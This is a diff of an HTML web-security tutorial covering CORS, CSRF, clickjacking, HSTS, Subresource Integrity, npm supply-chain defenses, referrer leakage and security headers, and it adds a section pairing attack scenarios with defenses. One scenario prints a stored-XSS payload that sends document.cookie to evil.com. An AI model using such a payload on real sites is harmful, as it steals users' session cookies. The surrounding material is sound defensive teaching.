+  <p>Browsers enforce a same-origin policy - JavaScript running on one origin cannot read the response to a request it made to a different origin. An origin is the combination of scheme, host, and port, so <code>https://app.example.com</code> and <code>https://api.example.com</code> count as different origins even though they share a domain. Without this rule, any page visited could quietly call a bank's API or a webmail API while the user happens to be logged into either, and read back whatever came out, if the session cookie's SameSite attribute is None. The <a href="#scenarios">inbox-reading scenario below</a> walks through exactly that.</p>
+
+  <h3>Why it only blocks reads, not sends</h3>
+  <p>A page on evilsite.com can still make the browser send a request to mail.com. The same-origin policy was never designed to stop that. Long before JavaScript could make a request at all, a plain HTML form or an <code>&lt;img&gt;</code> tag could already trigger a cross-origin GET or POST, and the web still depends on that today for ordinary links, embedded images, and third-party forms. Blocking all cross-origin sends outright would break huge parts of the web that have nothing to do with attackers. What the policy targets instead is stopping the attacker's page from reading whatever comes back. A request that changes something on the server, with no interest in reading the response, is a different problem entirely. That's CSRF, covered above, and it's why SameSite cookies and CSRF tokens exist as a defense that has nothing to do with CORS.</p>
+
+  <h3>CORS: opting specific origins back in</h3>
+  <p>CORS is the mechanism a server uses to tell the browser a particular origin is allowed to read its responses. The header-by-header mechanics, the preflight exchange, <code>Access-Control-Allow-Origin</code>, credentialed requests, are covered in the <a href="http.html#cors">HTTP article</a>. What's worth understanding here is why preflight exists at all.</p>
+
+  <p>A request with a custom header, a JSON body, or a method like <code>PUT</code> or <code>DELETE</code> is something a plain HTML form could never produce. Before <code>fetch</code> and XHR existed, no server had a reason to check where a request like that came from, because a cross-origin script had no way to send one. Most servers still don't check the <code>Origin</code> header on every request. A well-written one could reject an unexpected origin itself, but CORS can't assume every server does. So the browser first sends a side-effect-free <code>OPTIONS</code> request, and only sends the real one if the server explicitly answers with the right <code>Access-Control-*</code> headers. A server that's never heard of CORS simply won't answer correctly, and the real request never goes out. That protects servers that were never written with cross-origin JavaScript in mind, without requiring them to add anything.</p>
+
+  <div class="callout danger">
+    <div class="callout-title">A common misconfiguration</div>
+    <p>Some APIs reflect back whatever <code>Origin</code> header a request sends as <code>Access-Control-Allow-Origin</code>, instead of checking it against an allowlist. Combined with <code>Access-Control-Allow-Credentials: true</code>, this hands read access to authenticated responses to any origin that asks, which defeats the point of the policy entirely.</p>
+  </div>
+
+  <h3 id="xss-csrf-cors">XSS vs. CSRF vs. CORS</h3>
+  <div class="callout info">
+    <div class="callout-title">Three different boundaries, not three names for the same thing</div>
+    <p>XSS, CSRF, and CORS have similar names but are different things. XSS is an injection attack that exploits a site's failure to escape untrusted input. Defenses are output encoding, HttpOnly cookies, and CSP. CSRF is an attack that exploits the browser's automatic cookie attachment to forge a state-changing request. Defenses are SameSite cookies and CSRF tokens. CORS is not an attack. It's a protocol that allows a server to selectively relax the same-origin policy for trusted origins.</p>
+    <p>The mix-up usually comes from CSRF and CORS both involving a second origin. The browser sends a cross-origin request whether or not CORS allows it. CORS only governs whether the response can be read, not whether the request goes out. That's why a perfectly configured CORS policy does nothing to stop a CSRF attack, and a strict CSRF defense does nothing to stop a script from reading a response it was already permitted to read. XSS doesn't involve a second origin at all. It just means the attacker's code is running with the first origin's own trust, as if the site had written it.</p>
   </div>
 
   <!-- ══════════════════════════════════════════════════ -->
@@ -251,12 +282,12 @@
   <p class="lede">The attacker makes the victim click something they didn't intend to, by overlaying a transparent version of the target site on top of their own page.</p>
 
   <h3>How it works</h3>
-  <p>An attacker embeds the target site in a transparent <code>&lt;iframe&gt;</code> and positions it precisely over a button or link on their own page. The user sees the attacker's page and thinks they're clicking the attacker's button. They're actually clicking a "Confirm Transfer" or "Delete Account" button on the embedded site, while authenticated in that site's session.</p>
+  <p>An attacker embeds the target site in a transparent <code>&lt;iframe&gt;</code> and positions it precisely over a button or link on their own page. The user sees the attacker's page and thinks they're clicking the attacker's button. They're actually clicking a "Confirm Transfer" button on the embedded site, while authenticated in that site's session.</p>
 
   <h3>Defenses</h3>
-  <p>The defense is preventing your pages from being embedded in iframes you don't control. Two mechanisms do this.</p>
+  <p>The defense is preventing pages from being embedded in iframes outside the site's control. Two mechanisms do this.</p>
 
-  <p><code>X-Frame-Options</code> is the older header. <code>DENY</code> prevents embedding anywhere; <code>SAMEORIGIN</code> only allows embedding in iframes on the same origin.</p>
+  <p><code>X-Frame-Options</code> is the older header. <code>DENY</code> prevents embedding anywhere. <code>SAMEORIGIN</code> only allows embedding in iframes on the same origin.</p>
 
   <div class="header-block">
     <div><span class="hl-name">X-Frame-Options:</span> <span class="hl-value">DENY</span></div>
@@ -275,16 +306,16 @@
     <div><span class="hl-name">Content-Security-Policy:</span> <span class="hl-value">frame-ancestors 'self' https://partner.example.com</span></div>
   </div>
 
-  <p>Set both headers for maximum compatibility: <code>X-Frame-Options: DENY</code> for older browsers and <code>frame-ancestors 'none'</code> in CSP for modern ones.</p>
+  <p>For maximum compatibility, set both <code>X-Frame-Options: DENY</code> (for older browsers) and <code>frame-ancestors 'none'</code> in CSP for modern ones.</p>
 
   <!-- ══════════════════════════════════════════════════ -->
   <h2 id="hsts">Protocol Downgrade Attacks</h2>
   <p class="lede">HTTPS prevents eavesdropping, but only if the browser uses it. On the first visit, an attacker on the same network can intercept the initial HTTP request before HTTPS kicks in.</p>
 
   <h3>How it works</h3>
-  <p>SSL stripping is an attack where the attacker sits between the user and the server (on a café WiFi network, for example) and intercepts the initial HTTP request to a site. Instead of forwarding it to the server, the attacker communicates with the server over HTTPS themselves, then relays a plain HTTP version back to the victim. The user thinks they're talking to the real site; they're actually talking to the attacker. Since the victim's connection is HTTP, all their data is visible and modifiable.</p>
+  <p>Modern browsers already default to HTTPS in most cases. Type a bare domain into the address bar and the browser tries HTTPS first, and most links on the modern web already point to an <code>https://</code> URL. The downgrade risk that remains lives in the cases that bypass this default. A user types <code>http://</code> explicitly into the address bar, or clicks a link that hardcodes the <code>http://</code> scheme, perhaps an old bookmark, a link on a page that was never updated, a printed URL, or a QR code. In either case the browser's first request goes out as plain HTTP, and an attacker on the same network (a café WiFi network, for example) can intercept it before anything redirects to HTTPS.</p>
 
-  <p>This works because users typically type a domain name without an explicit <code>https://</code> prefix, and the browser's first request is HTTP. Even if the server immediately redirects to HTTPS, that redirect traverses the attacker's connection first.</p>
+  <p>SSL stripping is the classic form this attack takes. The attacker sits between the user and the server, intercepts that initial HTTP request, and instead of forwarding it, talks to the real server over HTTPS themselves while relaying a plain HTTP response back to the victim. The user thinks they're talking to the real site; they're actually talking to the attacker, and since the victim's own connection is HTTP, everything they send or receive is visible and modifiable. Even if the server's first response to the HTTP request is a redirect to HTTPS, that redirect still has to cross the attacker's connection first, so the attacker can simply intercept it and keep the victim on HTTP.</p>
 
   <h3>Defense: HSTS</h3>
   <p>HTTP Strict Transport Security (HSTS) instructs the browser to always use HTTPS for a domain (even if the user types HTTP) for a specified period. Once the browser has seen the HSTS header, it converts any HTTP request for that domain to HTTPS before sending it, bypassing any attacker in the middle.</p>
@@ -296,17 +327,17 @@
   <p><code>max-age</code> is in seconds: 31536000 is one year. <code>includeSubDomains</code> applies the policy to all subdomains, which prevents an attacker from attacking a subdomain to compromise the main site via cookies. <code>preload</code> (an optional additional directive) opts the domain into browser preload lists.</p>
 
   <h3>The first-visit problem and preloading</h3>
-  <p>HSTS solves the problem for <em>returning</em> visitors, but not the first visit. The browser hasn't yet received the HSTS header. The <strong>HSTS preload list</strong> is a list of domains that major browsers ship with, instructing them to always use HTTPS before the first request. Submitting to the preload list at <a href="https://hstspreload.org" target="_blank" rel="noopener">hstspreload.org</a> is free, but it is a significant commitment: removing a domain takes months and requires coordination with browser vendors. Only submit if you are certain every subdomain of your domain can serve HTTPS indefinitely.</p>
+  <p>HSTS solves the problem for <em>returning</em> visitors, but not the first visit. The browser hasn't yet received the HSTS header. The <strong>HSTS preload list</strong> is a list of domains that major browsers ship with, instructing them to always use HTTPS before the first request. Submitting to the preload list at <a href="https://hstspreload.org" target="_blank" rel="noopener">hstspreload.org</a> is free, but it is a significant commitment. Removing a domain takes months and requires coordination with browser vendors. Only submit if every subdomain of the domain is certain to serve HTTPS indefinitely.</p>
 
   <!-- ══════════════════════════════════════════════════ -->
   <h2 id="sri">Supply Chain Attacks</h2>
-  <p class="lede">When you load a third-party script, you trust that it will always contain what you expect. If the CDN or the script provider is compromised, your users run malicious code.</p>
+  <p class="lede">Loading a third-party script means trusting that it will always contain what's expected. If the CDN or the script provider is compromised, users run malicious code.</p>
 
   <h3>How it works</h3>
-  <p>Including a script from a CDN with a plain <code>&lt;script src="..."&gt;</code> tag means whatever that URL serves, your users execute. If the CDN is breached or the script provider's account is compromised, the injected code runs with full access to the page and can steal form inputs, session data, or anything else on the page. This happened to Polyfill.io in 2024, affecting hundreds of thousands of sites that trusted a shared CDN.</p>
+  <p>Including a script from a CDN with a plain <code>&lt;script src="..."&gt;</code> tag means whatever that URL serves, the users execute. If the CDN is breached or the script provider's account is compromised, the injected code runs with full access to the page and can steal form inputs, session data, or anything else on the page. This happened to Polyfill.io in 2024, affecting hundreds of thousands of sites that trusted a shared CDN.</p>
 
   <h3>Defense: Subresource Integrity</h3>
-  <p>Subresource Integrity (SRI) lets you specify the expected hash of a resource. The browser refuses to execute the script if its content doesn't match.</p>
+  <p>Subresource Integrity (SRI) lets a page specify the expected hash of a resource in the tag itself. The browser refuses to execute the script if its content doesn't match.</p>
 
   <div class="code-block">
     <div class="code-header">
@@ -320,14 +351,20 @@
 <span class="p">&gt;&lt;/</span><span class="kw">script</span><span class="p">&gt;</span></code></pre>
   </div>
 
-  <p>The hash is generated from the exact file content at the time you add the tag. SRI only works for static, versioned assets. It cannot protect dynamically updated scripts (where the URL stays the same but the content changes), because any legitimate update would also break the hash. For dynamically updated third-party scripts, the only reliable mitigation is to self-host a pinned version and update it manually.</p>
+  <p>The hash is generated from the exact file content at the time the tag is added. SRI only works for static, versioned assets. It cannot protect dynamically updated scripts (where the URL stays the same but the content changes), because any legitimate update would also break the hash. For dynamically updated third-party scripts, the only reliable mitigation is to self-host a pinned version and update it manually.</p>
+
+  <h3>The npm supply chain</h3>
+  <p>A CDN script tag is only one entry point. Most applications also pull in far more third-party code through npm, often hundreds of packages once transitive dependencies are counted, and none of it sits behind a browser script tag SRI can check. It gets installed on a developer's machine or a CI runner and ends up bundled directly into the production build, so the malicious code becomes part of the bundle before it ever reaches a browser. This isn't hypothetical: in 2021, an attacker compromised the maintainer account behind <code>ua-parser-js</code>, a package downloaded millions of times a week, and published versions containing a cryptominer and a credential stealer.</p>
+
+  <h3>Defense: lockfiles and auditing</h3>
+  <p>Committing a lockfile (<code>package-lock.json</code>) and installing with <code>npm ci</code> instead of <code>npm install</code> ensures every install uses the exact package versions that were already reviewed, rather than whatever a version range happens to resolve to on a given day. <code>npm audit</code> checks installed dependencies against a database of known-malicious and vulnerable packages, and should run in CI rather than only on a developer's machine. The same logic applies regardless of which package manager a project uses, pnpm and Yarn included.</p>
 
   <!-- ══════════════════════════════════════════════════ -->
   <h2 id="leakage">Information Leakage</h2>
   <p class="lede">Browsers share information with third parties as a side effect of normal navigation. Two headers give servers control over what gets shared.</p>
 
   <h3>Referrer-Policy</h3>
-  <p>When a user navigates from one page to another, or when a page loads a third-party resource, the browser sends a <code>Referer</code> header containing the current page's URL. This is useful for analytics, but it can also leak sensitive information: if your URLs contain user IDs, session tokens, or search terms, every third-party resource on the page receives that data.</p>
+  <p>When a user navigates from one page to another, or when a page loads a third-party resource, the browser sends a <code>Referer</code> header containing the current page's URL. This is useful for analytics, but it can also leak sensitive information if URLs contain user IDs, session tokens, or search terms. Every third-party resource on the page receives that data.</p>
 
   <div class="header-block">
     <div><span class="hl-comment"># Send only the origin (not the full URL) for cross-origin requests</span></div>
@@ -347,8 +384,111 @@
   <p>An empty value <code>()</code> disables the feature entirely. <code>(self)</code> allows it for the page itself but not for embedded iframes. This header matters most for pages that embed third-party iframes or advertising. Restricting permissions limits what those third parties can do regardless of their own code.</p>
 
   <!-- ══════════════════════════════════════════════════ -->
+  <h2 id="scenarios">Attack Scenarios: What Stops What</h2>
+  <p class="lede">Every section above explains a mechanism on its own. Attacks are easier to reason about as stories - what the attacker is after, and the one control that stops them.</p>
+  <p>The seven scenarios below cover every attack in this article, plus a variant of CSRF that steals data through a cross-origin read rather than forging a write.</p>
+
+  <h3>1. Stealing session tokens through an injected comment</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Malicious comment persists</div>
+      <p>A user opens a discussion thread on a forum while logged into their account. An attacker has planted a comment containing <code>&lt;script&gt;fetch('evil.com/steal?c='+document.cookie)&lt;/script&gt;</code>, aiming to steal visitors' session cookies. The browser renders the comment as markup instead of text, so the script runs in the user's session and sends their cookie to the attacker.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">Output encoding, HttpOnly</div>
+      <p>Output encoding is the primary defense. The comment is escaped before it lands in the page, so the browser renders it as text, not markup, and nothing executes. HttpOnly is the backstop. Even if a script does run, <code>document.cookie</code> can't see the session cookie at all.</p>
+    </div>
+  </div>
+
+  <h3>2. Forging a bank transfer</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Hidden auto-submit form</div>
+      <p>A user is logged into their bank at bank.com and visits evilsite.com. The attacker wants to drain the user's account, so a hidden form on the page auto-submits a POST to <code>bank.com/transfer</code> with the attacker's own account as the recipient.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">SameSite cookies</div>
+      <p><code>SameSite=Lax</code> or <code>Strict</code> on the session cookie means the browser won't attach it to a cross-site POST, so bank.com sees a request with no valid session and rejects it. CSRF tokens do the same job when SameSite can't be relied on.</p>
+    </div>
+  </div>
+
+  <h3>3. Reading someone else's inbox</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Cross-origin fetch</div>
+      <p>A user is logged into mail.com and visits evilsite.com. The attacker wants to read the user's private messages, so JavaScript on the page runs <code>fetch('mail.com/api/inbox')</code> and tries to read whatever comes back.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">SameSite cookies, then CORS</div>
+      <p>Two independent layers apply, and either one alone stops the theft. SameSite cookies aren't attached to cross-site <code>fetch</code> calls at all (unlike a top-level navigation, this is a subresource request), so mail.com may see no valid session to begin with. Even when the cookie is sent deliberately over a <code>SameSite=None</code> API, the same-origin policy still blocks evilsite.com's script from reading the response unless mail.com's CORS headers name evilsite.com as an allowed origin. Both layers would have to fail for the read to succeed.</p>
+    </div>
+  </div>
+
+  <h3>4. Hijacking a click</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Transparent iframe overlay</div>
+      <p>A user, logged into bank.com, visits evilsite.com to claim an advertised prize. The attacker actually wants them to delete their bank account, so bank.com's "Delete Account" page loads in a transparent iframe positioned exactly over the "Claim your prize" button. The user clicks the button and unknowingly clicks Delete Account instead.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">frame-ancestors</div>
+      <p><code>frame-ancestors</code> (or the older <code>X-Frame-Options</code>) tells the browser bank.com may not be framed by evilsite.com at all. The iframe never loads, so there's nothing to overlay.</p>
+    </div>
+  </div>
+
+  <h3>5. Stripping HTTPS on public WiFi</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">SSL stripping</div>
+      <p>A user connects to bank.com over café WiFi. The attacker wants to read and alter the user's traffic, including their login credentials, so they intercept the first plain-HTTP request, talk to the real bank.com over HTTPS themselves, and relay an unencrypted version back to the victim.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">HSTS</div>
+      <p>Once the browser has seen bank.com's <code>Strict-Transport-Security</code> header, or finds the domain on the preload list, it rewrites every request to HTTPS before anything leaves the machine. There's no plaintext request left for the attacker to intercept.</p>
+    </div>
+  </div>
+
+  <h3>6. A compromised CDN script</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Breached dependency</div>
+      <p>A user checks out on an online store that loads its charting library from a shared CDN. The attacker wants the payment details entered on that checkout page, so once the CDN is breached, the injected code runs with full page access on every site that includes the script, this one included.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">Subresource Integrity</div>
+      <p>The browser hashes the file before executing it and compares that hash to the one pinned in the <code>integrity</code> attribute when the tag was added. A modified file doesn't match, and the browser refuses to run it.</p>
+    </div>
+  </div>
+
+  <h3>7. Leaking a password reset link to an ad network</h3>
+  <div class="attack-defense">
+    <div class="card red">
+      <div class="card-label">Scenario</div>
+      <div class="card-title">Referer leakage</div>
+      <p>A user requests a password reset and clicks the emailed link, landing on <code>bank.com/reset?token=abc123</code>, a page that also loads a third-party analytics script. The attacker wants that token, since it can take over the account, and by default the browser hands over the full URL, token included, in the <code>Referer</code> header of every request the script makes.</p>
+    </div>
+    <div class="card teal">
+      <div class="card-label">What stops it</div>
+      <div class="card-title">Referrer-Policy</div>
+      <p><code>strict-origin-when-cross-origin</code> sends only the origin, no path or query string, to cross-origin requests. <code>no-referrer</code>, for the most sensitive pages, sends nothing at all. Either way, the token never leaves bank.com.</p>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════ -->
   <h2 id="header-summary">Security Header Summary</h2>
-  <p class="lede">A reference for the headers covered in this article: what each one does and a sensible default value.</p>
+  <p class="lede">A reference for the headers covered in this article, what each one does and a sensible default value.</p>
 
   <div class="table-wrap">
     <table>
@@ -369,7 +509,7 @@
         <tr>
           <td><code>X-Frame-Options</code></td>
           <td>Clickjacking</td>
-          <td><code>DENY</code> (or <code>SAMEORIGIN</code> if you embed your own content)</td>
+          <td><code>DENY</code> (or <code>SAMEORIGIN</code> when embedding same-origin content)</td>
         </tr>
         <tr>
           <td><code>Strict-Transport-Security</code></td>
@@ -384,14 +524,14 @@
         <tr>
           <td><code>Permissions-Policy</code></td>
           <td>Feature abuse by third-party scripts</td>
-          <td>Disable features you don't use: <code>camera=(), microphone=()</code></td>
+          <td>Disable unused features: <code>camera=(), microphone=()</code></td>
         </tr>
       </tbody>
     </table>
   </div>
 
   <div class="callout info">
-    <div class="callout-title">Testing your headers</div>
+    <div class="callout-title">Testing security headers</div>
     <p><a href="https://securityheaders.com" target="_blank" rel="noopener">securityheaders.com</a> scans any public URL and grades its security headers, showing which are missing and what each one does. It's a useful first check after deployment.</p>
   </div>
 
